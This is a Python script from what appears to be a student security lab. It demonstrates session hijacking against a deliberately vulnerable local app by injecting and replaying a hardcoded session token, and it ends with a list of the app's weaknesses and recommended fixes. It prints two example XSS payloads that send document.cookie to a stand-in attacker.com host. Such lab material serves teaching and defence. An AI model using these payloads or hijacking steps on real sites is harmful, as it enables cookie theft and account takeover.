#!/usr/bin/env python3
"""
Session Hijacking Demonstration Script
PCYB Cybersecurity Project - Educational Purpose Only

This script demonstrates session hijacking vulnerabilities in the target application.
The application has intentional security weaknesses for educational purposes:
1. Session cookie without HttpOnly flag (httponly=False)
2. Predictable session token value
3. No CSRF protection
4. Cookie transmitted without Secure flag

Attack vectors demonstrated:
- Direct cookie theft/injection
- Predictable session token exploitation
- Session replay attack
"""

import requests
import sys
from urllib.parse import urljoin

# Target application configuration
TARGET_URL = "http://localhost:5000"
SESSION_COOKIE_NAME = "PCYB_forum_session"
# Known/predictable session token from the application code
HIJACKED_SESSION_TOKEN = "admin_session_token_pcyb"


class SessionHijacker:
    """Demonstrates various session hijacking techniques"""
    
    def __init__(self, target_url=TARGET_URL):
        self.target_url = target_url
        self.session = requests.Session()
    
    def check_target_availability(self):
        """Check if target application is reachable"""
        try:
            response = self.session.get(self.target_url, timeout=5)
            print(f"[✓] Target application is reachable at {self.target_url}")
            print(f"[i] Response status: {response.status_code}")
            return True
        except requests.exceptions.ConnectionError:
            print(f"[✗] Cannot connect to {self.target_url}")
            print(f"[!] Make sure the Docker container is running:")
            print(f"    docker-compose -f aplikacja_celu/docker-compose.yml up")
            return False
        except Exception as e:
            print(f"[✗] Error: {e}")
            return False
    
    def hijack_session_predictable_token(self):
        """
        Attack Vector #1: Predictable Session Token
        The application uses a hardcoded, predictable session token.
        An attacker can simply inject this known token value.
        """
        print("\n" + "="*60)
        print("ATTACK VECTOR #1: Predictable Session Token")
        print("="*60)
        
        print(f"[i] Session cookie name: {SESSION_COOKIE_NAME}")
        print(f"[i] Predictable token value: {HIJACKED_SESSION_TOKEN}")
        
        # Inject the known session token
        self.session.cookies.set(SESSION_COOKIE_NAME, HIJACKED_SESSION_TOKEN)
        
        # Try to access protected resource
        protected_url = urljoin(self.target_url, "/protected")
        print(f"[*] Attempting to access: {protected_url}")
        
        response = self.session.get(protected_url)
        
        if response.status_code == 200 and "Witaj" in response.text:
            print("[✓] SESSION HIJACK SUCCESSFUL!")
            print(f"[✓] Gained unauthorized access to protected page")
            print(f"[✓] Response contains admin content")
            return True
        else:
            print("[✗] Session hijack failed")
            return False
    
    def demonstrate_cookie_theft_scenario(self):
        """
        Attack Vector #2: Cookie Theft via XSS
        Since httponly=False, JavaScript can access the cookie.
        This demonstrates what an attacker would extract via XSS.
        """
        print("\n" + "="*60)
        print("ATTACK VECTOR #2: Cookie Theft Simulation (XSS)")
        print("="*60)
        
        print("[i] The application sets cookies with httponly=False")
        print("[i] This allows JavaScript to access cookies via document.cookie")
        print("\n[i] Example XSS payload that would steal the cookie:")
        print("    <script>")
        print("      fetch('https://attacker.com/steal?cookie=' + document.cookie);")
        print("    </script>")
        
        print("\n[i] Or in a URL parameter (if reflected without sanitization):")
        print("    ?search=<img src=x onerror='new Image().src=\"https://attacker.com/?c=\"+document.cookie'>")
        
        print("\n[*] In a real attack, the stolen cookie would be:")
        print(f"    {SESSION_COOKIE_NAME}={HIJACKED_SESSION_TOKEN}")
        print("\n[*] Attacker then uses this stolen cookie to hijack the session")
    
    def demonstrate_session_replay(self):
        """
        Attack Vector #3: Session Replay
        Demonstrates using a captured/stolen session cookie
        """
        print("\n" + "="*60)
        print("ATTACK VECTOR #3: Session Replay Attack")
        print("="*60)
        
        print("[i] Simulating scenario where attacker captured cookie from network traffic")
        print("[i] or obtained it through other means (XSS, MITM, etc.)")
        
        # Create a new session (simulating attacker's browser)
        attacker_session = requests.Session()
        
        # Inject the stolen cookie
        attacker_session.cookies.set(SESSION_COOKIE_NAME, HIJACKED_SESSION_TOKEN)
        
        print(f"[*] Attacker sets stolen cookie: {SESSION_COOKIE_NAME}={HIJACKED_SESSION_TOKEN}")
        print(f"[*] Attempting to access admin panel...")
        
        # Access protected resources
        protected_url = urljoin(self.target_url, "/protected")
        response = attacker_session.get(protected_url)
        
        if response.status_code == 200 and "admin" in response.text.lower():
            print("[✓] Session replay successful!")
            print("[✓] Attacker has full access to victim's session")
            print(f"[i] Can access all pages as the authenticated user")
            return True
        else:
            print("[✗] Session replay failed")
            return False
    
    def extract_session_info(self):
        """Extract and display session information"""
        print("\n" + "="*60)
        print("SESSION INFORMATION EXTRACTION")
        print("="*60)
        
        protected_url = urljoin(self.target_url, "/protected")
        response = self.session.get(protected_url)
        
        print(f"[i] Current cookies in session:")
        for cookie in self.session.cookies:
            print(f"    Name: {cookie.name}")
            print(f"    Value: {cookie.value}")
            print(f"    Domain: {cookie.domain}")
            print(f"    Path: {cookie.path}")
            print(f"    Secure: {cookie.secure}")
            print(f"    HttpOnly: {cookie.has_nonstandard_attr('HttpOnly')}")
            print()


def main():
    print("""
╔═══════════════════════════════════════════════════════════╗
║     SESSION HIJACKING DEMONSTRATION                       ║
║     PCYB Cybersecurity Project                            ║
║     Educational Purpose Only - Authorized Testing         ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Initialize hijacker
    hijacker = SessionHijacker()
    
    # Check if target is available
    if not hijacker.check_target_availability():
        sys.exit(1)
    
    # Demonstrate different attack vectors
    print("\n[*] Starting demonstration of session hijacking techniques...")
    
    # Attack 1: Predictable token
    success = hijacker.hijack_session_predictable_token()
    
    # Attack 2: XSS cookie theft (educational explanation)
    hijacker.demonstrate_cookie_theft_scenario()
    
    # Attack 3: Session replay
    hijacker.demonstrate_session_replay()
    
    # Extract session info
    hijacker.extract_session_info()
    
    # Summary
    print("\n" + "="*60)
    print("VULNERABILITY SUMMARY")
    print("="*60)
    print("""
The target application has the following vulnerabilities:

1. ❌ Predictable Session Token
   - Hardcoded token value in source code
   - No randomization or cryptographic generation
   - Token: 'admin_session_token_pcyb'

2. ❌ Cookie Without HttpOnly Flag
   - httponly=False allows JavaScript access
   - Vulnerable to XSS-based cookie theft
   - document.cookie can read the session token

3. ❌ Cookie Without Secure Flag
   - secure=False allows transmission over HTTP
   - Vulnerable to network sniffing/MITM attacks
   - Cookie can be intercepted on unencrypted connections

4. ❌ No Session Validation
   - No IP address binding
   - No User-Agent validation
   - No session timeout mechanism
   - Stolen sessions remain valid indefinitely

5. ❌ Same-Site Cookie Policy Too Permissive
   - samesite='Lax' allows some cross-site requests
   - Should use 'Strict' for sensitive operations

RECOMMENDED FIXES:
------------------
✓ Generate cryptographically random session tokens
✓ Set httponly=True to prevent JavaScript access
✓ Set secure=True to enforce HTTPS-only transmission
✓ Implement proper session validation (IP, User-Agent)
✓ Add session timeout and regeneration on sensitive actions
✓ Use samesite='Strict' for better CSRF protection
✓ Implement CSRF tokens for state-changing operations
✓ Add rate limiting for login attempts
✓ Log and monitor for suspicious session activity
    """)
    
    print("\n[✓] Demonstration completed successfully" if success else "\n[!] Some demonstrations failed")
    print("[i] This script is for educational purposes only")
    print("[i] Only use on systems you own or have explicit permission to test\n")


if __name__ == "__main__":
    main()
